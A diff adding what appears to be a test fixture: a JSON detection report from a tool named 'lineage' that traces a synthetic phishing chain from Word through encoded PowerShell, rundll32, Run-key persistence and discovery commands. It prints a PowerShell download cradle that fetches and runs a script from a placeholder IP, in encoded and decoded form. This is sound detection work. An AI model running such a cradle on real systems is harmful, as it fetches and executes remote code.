@@ -1,0 +1,1058 @@
+{
+  "envelope": {
+    "schema": "7d7b-report",
+    "schema_version": 1,
+    "tool": "lineage",
+    "tool_version": "<version>",
+    "run_id": "00000000-0000-4000-8000-000000000001",
+    "started_at": "2026-10-14T17:46:40Z",
+    "completed_at": "2026-10-14T17:46:40Z"
+  },
+  "status": "findings_detected",
+  "result": "findings_detected",
+  "input": [
+    {
+      "label": "phish_chain.jsonl",
+      "format": "jsonl",
+      "sha256": "db620e636182a6f21e94d4bbcd8ff6f384e884428684c4ba5eabf369434ecedc",
+      "size_bytes": 11887
+    }
+  ],
+  "parameters": {
+    "hosts": [],
+    "rules": "all",
+    "min_severity": "info",
+    "since": null,
+    "until": null,
+    "focus": null,
+    "gap_seconds": 600,
+    "telemetry_gap_seconds": 1800,
+    "max_records": 2000000,
+    "timestamp_source": "utc_time, then time_created",
+    "rule_set_sha256": "0b12635a12cf74da8827a956dc5a3355676713e73f9af78939d0ddf67b04553a",
+    "attack_version": "unpinned",
+    "around": null,
+    "window": null,
+    "hot_only": false,
+    "storyline": null,
+    "max_steps": 60,
+    "max_file_size_mb": 2048
+  },
+  "coverage": {
+    "complete": true,
+    "reasons": [],
+    "counters": {
+      "records_total": 19,
+      "sysmon": 19,
+      "irrelevant": 0,
+      "invalid": 0,
+      "invalid_by_reason": {},
+      "duplicates_dropped": 0,
+      "duplicate_conflicts": 0,
+      "bad_guid": 0,
+      "ghosts": {
+        "access_reference": 3,
+        "parent_reference": 2
+      },
+      "cycles_broken": 0,
+      "unattached_events": 0,
+      "unattached_findings": 0,
+      "anchor_unverified": 0
+    },
+    "event_ids_seen": {
+      "1": 11,
+      "3": 2,
+      "8": 1,
+      "10": 1,
+      "11": 2,
+      "13": 1,
+      "22": 1
+    },
+    "event_ids_missing": [
+      5,
+      7,
+      12,
+      23
+    ],
+    "rules": {
+      "CMD-001": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 2
+      },
+      "CMD-002": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 1
+      },
+      "CMD-003": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 0
+      },
+      "CMD-004": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 0
+      },
+      "CMD-005": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 0
+      },
+      "CMD-006": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 0
+      },
+      "CMD-007": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 0
+      },
+      "CRD-001": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 1,
+        "findings": 0
+      },
+      "CRD-002": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 0
+      },
+      "GR-001": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 13,
+        "findings": 2
+      },
+      "GR-002": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 1
+      },
+      "GR-003": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 13,
+        "findings": 1
+      },
+      "GR-004": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 0
+      },
+      "INJ-001": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 1,
+        "findings": 0
+      },
+      "LIN-001": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 1
+      },
+      "LIN-002": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 0
+      },
+      "LIN-003": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 0
+      },
+      "LOC-001": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 1
+      },
+      "LOC-002": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 0
+      },
+      "NET-001": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 2,
+        "findings": 1
+      },
+      "PER-001": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 1,
+        "findings": 1
+      },
+      "PER-002": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 11,
+        "findings": 0
+      },
+      "PER-003": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 12,
+        "findings": 0
+      },
+      "PER-004": {
+        "state": "evaluable",
+        "missing_event_ids": [],
+        "events_examined": 2,
+        "findings": 0
+      }
+    },
+    "hosts": [
+      "ws-14.corp.example"
+    ],
+    "timeline": {
+      "span": {
+        "from": "2026-10-12T10:00:00Z",
+        "to": "2026-10-12T11:01:10Z"
+      },
+      "gaps": [
+        {
+          "host": "ws-14.corp.example",
+          "from": "2026-10-12T10:02:55Z",
+          "to": "2026-10-12T11:00:00Z",
+          "seconds": 3425
+        }
+      ],
+      "out_of_order": 0
+    }
+  },
+  "summary": {
+    "hosts": 1,
+    "events": 19,
+    "nodes": 16,
+    "ghosts": 5,
+    "findings_total": 11,
+    "findings_by_severity": {
+      "high": 5,
+      "medium": 5,
+      "low": 1,
+      "info": 0
+    },
+    "storylines": 2,
+    "rules_evaluable": 24,
+    "rules_not_evaluable": 0
+  },
+  "findings": [
+    {
+      "event": "CMD-001",
+      "category": "detection",
+      "subject": "process:ws-14.corp.example/8f3c2a71-5e4b-4d9a-a1c3-0000000000d1",
+      "details": {
+        "finding_id": "ff706ec167ce",
+        "title": "Encoded PowerShell command",
+        "severity": "medium",
+        "attack": [
+          "T1059.001",
+          "T1027.010"
+        ],
+        "tactics": [
+          "execution",
+          "defense-evasion"
+        ],
+        "why": "Passing a base64-encoded script hides the command from casual review and from naive command-line matching; it is common in loaders and rare in hand-written admin work.\n",
+        "image_name": "cmd.exe",
+        "first_seen": "2026-10-12T10:02:05Z",
+        "last_seen": "2026-10-12T10:02:05Z",
+        "count": 1,
+        "storyline": "S1",
+        "evidence": [
+          {
+            "file": "phish_chain.jsonl",
+            "index": 4,
+            "record_id": 5005
+          }
+        ],
+        "evidence_truncated": false,
+        "command_line": "cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgAxADAALwBhAC4AcABzADEAJwApAA==",
+        "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')"
+      }
+    },
+    {
+      "event": "LIN-001",
+      "category": "detection",
+      "subject": "process:ws-14.corp.example/8f3c2a71-5e4b-4d9a-a1c3-0000000000d1",
+      "details": {
+        "finding_id": "b8b8a989f081",
+        "title": "Office application spawned an interpreter",
+        "severity": "high",
+        "attack": [
+          "T1204.002"
+        ],
+        "tactics": [
+          "execution"
+        ],
+        "why": "Office documents that start a shell, script host or proxy-execution binary are a classic phishing payload; Office rarely needs to launch interpreters in normal use.\n",
+        "image_name": "cmd.exe",
+        "first_seen": "2026-10-12T10:02:05Z",
+        "last_seen": "2026-10-12T10:02:05Z",
+        "count": 1,
+        "storyline": "S1",
+        "evidence": [
+          {
+            "file": "phish_chain.jsonl",
+            "index": 4,
+            "record_id": 5005
+          }
+        ],
+        "evidence_truncated": false,
+        "command_line": "cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgAxADAALwBhAC4AcABzADEAJwApAA==",
+        "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')"
+      }
+    },
+    {
+      "event": "CMD-001",
+      "category": "detection",
+      "subject": "process:ws-14.corp.example/8f3c2a71-5e4b-4d9a-a1c3-0000000000e1",
+      "details": {
+        "finding_id": "7a2b934f699e",
+        "title": "Encoded PowerShell command",
+        "severity": "medium",
+        "attack": [
+          "T1059.001",
+          "T1027.010"
+        ],
+        "tactics": [
+          "execution",
+          "defense-evasion"
+        ],
+        "why": "Passing a base64-encoded script hides the command from casual review and from naive command-line matching; it is common in loaders and rare in hand-written admin work.\n",
+        "image_name": "powershell.exe",
+        "first_seen": "2026-10-12T10:02:06Z",
+        "last_seen": "2026-10-12T10:02:06Z",
+        "count": 1,
+        "storyline": "S1",
+        "evidence": [
+          {
+            "file": "phish_chain.jsonl",
+            "index": 5,
+            "record_id": 5006
+          }
+        ],
+        "evidence_truncated": false,
+        "command_line": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgAxADAALwBhAC4AcABzADEAJwApAA==",
+        "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')"
+      }
+    },
+    {
+      "event": "CMD-002",
+      "category": "detection",
+      "subject": "process:ws-14.corp.example/8f3c2a71-5e4b-4d9a-a1c3-0000000000e1",
+      "details": {
+        "finding_id": "cf3106922ebd",
+        "title": "PowerShell download cradle",
+        "severity": "high",
+        "attack": [
+          "T1059.001",
+          "T1105"
+        ],
+        "tactics": [
+          "execution",
+          "command-and-control"
+        ],
+        "why": "PowerShell fetching remote content in one command is a common first-stage loader pattern; admin scripts rarely download and run code inline.\n",
+        "image_name": "powershell.exe",
+        "first_seen": "2026-10-12T10:02:06Z",
+        "last_seen": "2026-10-12T10:02:06Z",
+        "count": 1,
+        "storyline": "S1",
+        "evidence": [
+          {
+            "file": "phish_chain.jsonl",
+            "index": 5,
+            "record_id": 5006
+          }
+        ],
+        "evidence_truncated": false,
+        "command_line": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgAxADAALwBhAC4AcABzADEAJwApAA==",
+        "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')"
+      }
+    },
+    {
+      "event": "GR-001",
+      "category": "detection",
+      "subject": "process:ws-14.corp.example/8f3c2a71-5e4b-4d9a-a1c3-0000000000e1",
+      "details": {
+        "finding_id": "e66c118a06c7",
+        "title": "Office-descended process connected out",
+        "severity": "high",
+        "attack": [
+          "T1204.002"
+        ],
+        "tactics": [
+          "execution",
+          "command-and-control"
+        ],
+        "why": "A process started below an Office application made an outbound connection; documents that launch helpers which then reach the network are a common phishing delivery pattern.",
+        "image_name": "powershell.exe",
+        "first_seen": "2026-10-12T10:02:08Z",
+        "last_seen": "2026-10-12T10:02:08Z",
+        "count": 1,
+        "storyline": "S1",
+        "evidence": [
+          {
+            "file": "phish_chain.jsonl",
+            "index": 7,
+            "record_id": 5008
+          }
+        ],
+        "evidence_truncated": false,
+        "office_ancestor": "winword.exe",
+        "destination": "203.0.113.10:80/tcp"
+      }
+    },
+    {
+      "event": "GR-001",
+      "category": "detection",
+      "subject": "process:ws-14.corp.example/8f3c2a71-5e4b-4d9a-a1c3-0000000000f1",
+      "details": {
+        "finding_id": "77e3e360f490",
+        "title": "Office-descended process connected out",
+        "severity": "high",
+        "attack": [
+          "T1204.002"
+        ],
+        "tactics": [
+          "execution",
+          "command-and-control"
+        ],
+        "why": "A process started below an Office application made an outbound connection; documents that launch helpers which then reach the network are a common phishing delivery pattern.",
+        "image_name": "rundll32.exe",
+        "first_seen": "2026-10-12T10:02:30Z",
+        "last_seen": "2026-10-12T10:02:30Z",
+        "count": 1,
+        "storyline": "S1",
+        "evidence": [
+          {
+            "file": "phish_chain.jsonl",
+            "index": 11,
+            "record_id": 5012
+          }
+        ],
+        "evidence_truncated": false,
+        "office_ancestor": "winword.exe",
+        "destination": "198.51.100.20:443/tcp"
+      }
+    },
+    {
+      "event": "NET-001",
+      "category": "detection",
+      "subject": "process:ws-14.corp.example/8f3c2a71-5e4b-4d9a-a1c3-0000000000f1",
+      "details": {
+        "finding_id": "b7f45d09d9ac",
+        "title": "Proxy-execution binary made a network connection",
+        "severity": "high",
+        "attack": [
+          "T1218",
+          "T1105"
+        ],
+        "tactics": [
+          "defense-evasion",
+          "command-and-control"
+        ],
+        "why": "Signed Windows binaries that can run arbitrary code rarely need to open outbound connections; when they do, they are often fetching or talking to a payload.\n",
+        "image_name": "rundll32.exe",
+        "first_seen": "2026-10-12T10:02:30Z",
+        "last_seen": "2026-10-12T10:02:30Z",
+        "count": 1,
+        "storyline": "S1",
+        "evidence": [
+          {
+            "file": "phish_chain.jsonl",
+            "index": 11,
+            "record_id": 5012
+          }
+        ],
+        "evidence_truncated": false,
+        "destination": "198.51.100.20:443/tcp",
+        "destination_hostname": "cdn.example"
+      }
+    },
+    {
+      "event": "PER-001",
+      "category": "detection",
+      "subject": "process:ws-14.corp.example/8f3c2a71-5e4b-4d9a-a1c3-0000000000f1",
+      "details": {
+        "finding_id": "7d8c1439c204",
+        "title": "Registry Run key set",
+        "severity": "medium",
+        "attack": [
+          "T1547.001"
+        ],
+        "tactics": [
+          "persistence"
+        ],
+        "why": "Values under the Run and RunOnce keys start a program at every logon, the most common way for malware to survive a reboot.\n",
+        "image_name": "rundll32.exe",
+        "first_seen": "2026-10-12T10:02:40Z",
+        "last_seen": "2026-10-12T10:02:40Z",
+        "count": 1,
+        "storyline": "S1",
+        "evidence": [
+          {
+            "file": "phish_chain.jsonl",
+            "index": 12,
+            "record_id": 5013
+          }
+        ],
+        "evidence_truncated": false,
+        "target_object": "HKU\\S-1-5-21-3623811015-3361044348-30300820-1013\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+        "details": "C:\\Users\\Public\\upd.exe"
+      }
+    },
+    {
+      "event": "GR-003",
+      "category": "detection",
+      "subject": "process:ws-14.corp.example/8f3c2a71-5e4b-4d9a-a1c3-000000000091",
+      "details": {
+        "finding_id": "bcfb52279972",
+        "title": "Dropped file later executed",
+        "severity": "medium",
+        "attack": [
+          "T1105"
+        ],
+        "tactics": [
+          "execution"
+        ],
+        "why": "A file written to disk and then started as a process on the same host is how dropped payloads usually begin.",
+        "image_name": "upd.exe",
+        "first_seen": "2026-10-12T11:00:00Z",
+        "last_seen": "2026-10-12T11:00:00Z",
+        "count": 1,
+        "storyline": "S2",
+        "evidence": [
+          {
+            "file": "phish_chain.jsonl",
+            "index": 15,
+            "record_id": 5016
+          }
+        ],
+        "evidence_truncated": false,
+        "target_filename": "C:\\Users\\Public\\upd.exe",
+        "creator_guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000e1",
+        "creator_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "write_file": "phish_chain.jsonl",
+        "write_index": "8"
+      }
+    },
+    {
+      "event": "LOC-001",
+      "category": "detection",
+      "subject": "process:ws-14.corp.example/8f3c2a71-5e4b-4d9a-a1c3-000000000091",
+      "details": {
+        "finding_id": "12f238deb6a6",
+        "title": "Execution from a user-writable staging path",
+        "severity": "low",
+        "attack": [],
+        "tactics": [
+          "execution"
+        ],
+        "why": "Programs started from Public, Temp, Downloads, the recycle bin or PerfLogs are often freshly dropped tools. This is a context signal: installers also run from these places.\n",
+        "image_name": "upd.exe",
+        "first_seen": "2026-10-12T11:00:00Z",
+        "last_seen": "2026-10-12T11:00:00Z",
+        "count": 1,
+        "storyline": "S2",
+        "evidence": [
+          {
+            "file": "phish_chain.jsonl",
+            "index": 15,
+            "record_id": 5016
+          }
+        ],
+        "evidence_truncated": false,
+        "command_line": "C:\\Users\\Public\\upd.exe"
+      }
+    },
+    {
+      "event": "GR-002",
+      "category": "detection",
+      "subject": "process:ws-14.corp.example/8f3c2a71-5e4b-4d9a-a1c3-000000000091",
+      "details": {
+        "finding_id": "aa6bb04453ad",
+        "title": "Discovery burst",
+        "severity": "medium",
+        "attack": [
+          "T1033",
+          "T1082",
+          "T1016",
+          "T1087",
+          "T1482",
+          "T1057"
+        ],
+        "tactics": [
+          "discovery"
+        ],
+        "why": "Three or more different discovery tools started by one parent within two minutes look like hands-on or scripted reconnaissance rather than routine use.",
+        "image_name": "upd.exe",
+        "first_seen": "2026-10-12T11:00:10Z",
+        "last_seen": "2026-10-12T11:01:10Z",
+        "count": 3,
+        "storyline": "S2",
+        "evidence": [
+          {
+            "file": "phish_chain.jsonl",
+            "index": 16,
+            "record_id": 5017
+          },
+          {
+            "file": "phish_chain.jsonl",
+            "index": 17,
+            "record_id": 5018
+          },
+          {
+            "file": "phish_chain.jsonl",
+            "index": 18,
+            "record_id": 5019
+          }
+        ],
+        "evidence_truncated": false,
+        "binaries": "ipconfig.exe, systeminfo.exe, whoami.exe"
+      }
+    }
+  ],
+  "storylines": [
+    {
+      "storyline_id": "S1",
+      "host": "ws-14.corp.example",
+      "root_guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000b1",
+      "root_image_name": "outlook.exe",
+      "anchor_image_name": "explorer.exe",
+      "flagged": [
+        "8f3c2a71-5e4b-4d9a-a1c3-0000000000d1",
+        "8f3c2a71-5e4b-4d9a-a1c3-0000000000e1",
+        "8f3c2a71-5e4b-4d9a-a1c3-0000000000f1"
+      ],
+      "path_nodes": [
+        "8f3c2a71-5e4b-4d9a-a1c3-0000000000b1",
+        "8f3c2a71-5e4b-4d9a-a1c3-0000000000c1"
+      ],
+      "descendant_nodes": [],
+      "nodes": [
+        "8f3c2a71-5e4b-4d9a-a1c3-0000000000b1",
+        "8f3c2a71-5e4b-4d9a-a1c3-0000000000c1",
+        "8f3c2a71-5e4b-4d9a-a1c3-0000000000d1",
+        "8f3c2a71-5e4b-4d9a-a1c3-0000000000e1",
+        "8f3c2a71-5e4b-4d9a-a1c3-0000000000f1"
+      ],
+      "finding_ids": [
+        "ff706ec167ce",
+        "b8b8a989f081",
+        "7a2b934f699e",
+        "cf3106922ebd",
+        "e66c118a06c7",
+        "77e3e360f490",
+        "b7f45d09d9ac",
+        "7d8c1439c204"
+      ],
+      "max_severity": "high",
+      "tactics": [
+        "execution",
+        "defense-evasion",
+        "command-and-control",
+        "persistence"
+      ],
+      "users": [
+        "CORP\\jdoe"
+      ],
+      "start": "2026-10-12T10:01:00Z",
+      "end": "2026-10-12T10:02:40Z",
+      "steps": [
+        {
+          "n": 1,
+          "time": "2026-10-12T10:01:00Z",
+          "tactic": null,
+          "technique": null,
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000b1",
+          "image_name": "outlook.exe",
+          "action": "process_create",
+          "text": "explorer.exe spawned outlook.exe \"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
+          "severity": null,
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 2,
+            "record_id": 5003
+          }
+        },
+        {
+          "n": 2,
+          "time": "2026-10-12T10:02:00Z",
+          "tactic": null,
+          "technique": null,
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000c1",
+          "image_name": "winword.exe",
+          "action": "process_create",
+          "text": "outlook.exe spawned winword.exe \"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jdoe\u2026",
+          "severity": null,
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 3,
+            "record_id": 5004
+          }
+        },
+        {
+          "n": 3,
+          "time": "2026-10-12T10:02:05Z",
+          "tactic": "execution",
+          "technique": "T1204.002",
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000d1",
+          "image_name": "cmd.exe",
+          "action": "process_create",
+          "text": "winword.exe spawned cmd.exe cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjA\u2026 [CMD-001, LIN-001]",
+          "severity": "high",
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 4,
+            "record_id": 5005
+          }
+        },
+        {
+          "n": 4,
+          "time": "2026-10-12T10:02:05Z",
+          "tactic": null,
+          "technique": null,
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000d1",
+          "image_name": "cmd.exe",
+          "action": "decoded",
+          "text": "cmd.exe decoded: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')",
+          "severity": null,
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 4,
+            "record_id": 5005
+          }
+        },
+        {
+          "n": 5,
+          "time": "2026-10-12T10:02:06Z",
+          "tactic": "execution",
+          "technique": "T1059.001",
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000e1",
+          "image_name": "powershell.exe",
+          "action": "process_create",
+          "text": "cmd.exe spawned powershell.exe powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUA\u2026 [CMD-001, CMD-002]",
+          "severity": "high",
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 5,
+            "record_id": 5006
+          }
+        },
+        {
+          "n": 6,
+          "time": "2026-10-12T10:02:06Z",
+          "tactic": null,
+          "technique": null,
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000e1",
+          "image_name": "powershell.exe",
+          "action": "decoded",
+          "text": "powershell.exe decoded: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')",
+          "severity": null,
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 5,
+            "record_id": 5006
+          }
+        },
+        {
+          "n": 7,
+          "time": "2026-10-12T10:02:07Z",
+          "tactic": null,
+          "technique": null,
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000e1",
+          "image_name": "powershell.exe",
+          "action": "dns",
+          "text": "powershell.exe resolved dl.example",
+          "severity": null,
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 6,
+            "record_id": 5007
+          }
+        },
+        {
+          "n": 8,
+          "time": "2026-10-12T10:02:08Z",
+          "tactic": "execution",
+          "technique": "T1204.002",
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000e1",
+          "image_name": "powershell.exe",
+          "action": "network",
+          "text": "powershell.exe \u2192 203.0.113.10:80/tcp (dl.example) [GR-001]",
+          "severity": "high",
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 7,
+            "record_id": 5008
+          }
+        },
+        {
+          "n": 9,
+          "time": "2026-10-12T10:02:10Z",
+          "tactic": null,
+          "technique": null,
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000e1",
+          "image_name": "powershell.exe",
+          "action": "file_create",
+          "text": "powershell.exe wrote C:\\Users\\Public\\upd.exe",
+          "severity": null,
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 8,
+            "record_id": 5009
+          }
+        },
+        {
+          "n": 10,
+          "time": "2026-10-12T10:02:11Z",
+          "tactic": null,
+          "technique": null,
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000e1",
+          "image_name": "powershell.exe",
+          "action": "file_create",
+          "text": "powershell.exe wrote C:\\Users\\Public\\stage.dll",
+          "severity": null,
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 9,
+            "record_id": 5010
+          }
+        },
+        {
+          "n": 11,
+          "time": "2026-10-12T10:02:20Z",
+          "tactic": null,
+          "technique": null,
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000f1",
+          "image_name": "rundll32.exe",
+          "action": "process_create",
+          "text": "powershell.exe spawned rundll32.exe rundll32.exe C:\\Users\\Public\\stage.dll,Start",
+          "severity": null,
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 10,
+            "record_id": 5011
+          }
+        },
+        {
+          "n": 12,
+          "time": "2026-10-12T10:02:30Z",
+          "tactic": "execution",
+          "technique": "T1204.002",
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000f1",
+          "image_name": "rundll32.exe",
+          "action": "network",
+          "text": "rundll32.exe \u2192 198.51.100.20:443/tcp (cdn.example) [GR-001, NET-001]",
+          "severity": "high",
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 11,
+            "record_id": 5012
+          }
+        },
+        {
+          "n": 13,
+          "time": "2026-10-12T10:02:40Z",
+          "tactic": "persistence",
+          "technique": "T1547.001",
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-0000000000f1",
+          "image_name": "rundll32.exe",
+          "action": "finding",
+          "text": "Registry Run key set: HKU\\S-1-5-21-3623811015-3361044348-30300820-1013\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+          "severity": "medium",
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 12,
+            "record_id": 5013
+          }
+        }
+      ],
+      "gaps": [],
+      "scope": {
+        "users": [
+          "CORP\\jdoe"
+        ],
+        "process_count": 5,
+        "ghost_count": 0,
+        "files_created": [
+          "C:\\Users\\Public\\upd.exe",
+          "C:\\Users\\Public\\stage.dll"
+        ],
+        "executable_files": 2,
+        "registry_set": [
+          "HKU\\S-1-5-21-3623811015-3361044348-30300820-1013\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+        ],
+        "persistence": [
+          "Registry Run key set \u2192 HKU\\S-1-5-21-3623811015-3361044348-30300820-1013\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
+        ],
+        "destinations": [
+          "203.0.113.10:80/tcp",
+          "198.51.100.20:443/tcp"
+        ],
+        "dns_names": [
+          "dl.example",
+          "cdn.example"
+        ],
+        "decoded_payloads": 2,
+        "review": {
+          "processes": 5,
+          "files": 2,
+          "registry_keys": 1,
+          "persistence": 1,
+          "destinations": 2
+        }
+      },
+      "links": []
+    },
+    {
+      "storyline_id": "S2",
+      "host": "ws-14.corp.example",
+      "root_guid": "8f3c2a71-5e4b-4d9a-a1c3-000000000091",
+      "root_image_name": "upd.exe",
+      "anchor_image_name": "services.exe",
+      "flagged": [
+        "8f3c2a71-5e4b-4d9a-a1c3-000000000091"
+      ],
+      "path_nodes": [],
+      "descendant_nodes": [
+        "8f3c2a71-5e4b-4d9a-a1c3-000000000092",
+        "8f3c2a71-5e4b-4d9a-a1c3-000000000093",
+        "8f3c2a71-5e4b-4d9a-a1c3-000000000094"
+      ],
+      "nodes": [
+        "8f3c2a71-5e4b-4d9a-a1c3-000000000091",
+        "8f3c2a71-5e4b-4d9a-a1c3-000000000092",
+        "8f3c2a71-5e4b-4d9a-a1c3-000000000093",
+        "8f3c2a71-5e4b-4d9a-a1c3-000000000094"
+      ],
+      "finding_ids": [
+        "bcfb52279972",
+        "12f238deb6a6",
+        "aa6bb04453ad"
+      ],
+      "max_severity": "medium",
+      "tactics": [
+        "execution",
+        "discovery"
+      ],
+      "users": [
+        "NT AUTHORITY\\SYSTEM"
+      ],
+      "start": "2026-10-12T11:00:00Z",
+      "end": "2026-10-12T11:01:10Z",
+      "steps": [
+        {
+          "n": 1,
+          "time": "2026-10-12T11:00:00Z",
+          "tactic": "execution",
+          "technique": "T1105",
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-000000000091",
+          "image_name": "upd.exe",
+          "action": "process_create",
+          "text": "services.exe spawned upd.exe C:\\Users\\Public\\upd.exe [GR-003, LOC-001]",
+          "severity": "medium",
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 15,
+            "record_id": 5016
+          }
+        },
+        {
+          "n": 2,
+          "time": "2026-10-12T11:00:10Z",
+          "tactic": "discovery",
+          "technique": "T1033",
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-000000000092",
+          "image_name": "whoami.exe",
+          "action": "process_create",
+          "text": "upd.exe spawned whoami.exe whoami /all [GR-002]",
+          "severity": "medium",
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 16,
+            "record_id": 5017
+          }
+        },
+        {
+          "n": 3,
+          "time": "2026-10-12T11:00:40Z",
+          "tactic": "discovery",
+          "technique": "T1033",
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-000000000093",
+          "image_name": "ipconfig.exe",
+          "action": "process_create",
+          "text": "upd.exe spawned ipconfig.exe ipconfig /all [GR-002]",
+          "severity": "medium",
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 17,
+            "record_id": 5018
+          }
+        },
+        {
+          "n": 4,
+          "time": "2026-10-12T11:01:10Z",
+          "tactic": "discovery",
+          "technique": "T1033",
+          "guid": "8f3c2a71-5e4b-4d9a-a1c3-000000000094",
+          "image_name": "systeminfo.exe",
+          "action": "process_create",
+          "text": "upd.exe spawned systeminfo.exe systeminfo [GR-002]",
+          "severity": "medium",
+          "source": {
+            "file": "phish_chain.jsonl",
+            "index": 18,
+            "record_id": 5019
+          }
+        }
+      ],
+      "gaps": [],
+      "scope": {
+        "users": [
+          "NT AUTHORITY\\SYSTEM"
+        ],
+        "process_count": 4,
+        "ghost_count": 0,
+        "files_created": [],
+        "executable_files": 0,
+        "registry_set": [],
+        "persistence": [],
+        "destinations": [],
+        "dns_names": [],
+        "decoded_payloads": 0,
+        "review": {
+          "processes": 4,
+          "files": 0,
